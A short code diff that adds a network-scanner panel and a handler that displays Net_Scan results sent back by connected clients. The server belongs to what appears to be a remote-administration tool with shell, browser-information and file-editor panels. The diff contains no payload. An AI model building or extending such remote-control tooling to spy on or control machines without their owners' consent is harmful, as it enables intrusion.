@@ -13,6 +13,7 @@
 #include "panel_wmanager.hpp"
 #include "panel_info_chrome.hpp"
 #include "panel_usuarios.hpp"
+#include "panel_escaner.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -541,6 +542,18 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         return;
     }
 
+    //mod escaner red
+    if (iComando == EnumComandos::Net_Scan) {
+        if (this->m_isFrameVisible()) {
+            panelEscaner* temp_pn = (panelEscaner*)wxWindow::FindWindowById(EnumEscanerIDS::Main_Window, this->n_Frame);
+            if (temp_pn) {
+                temp_pn->AddData(paquete.cBuffer.data());
+            }else {
+                DEBUG_MSG("[!] No se pudo encontrar ventana de escaner de red");
+            }
+        }
+        return;
+    }
 }
 
 void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
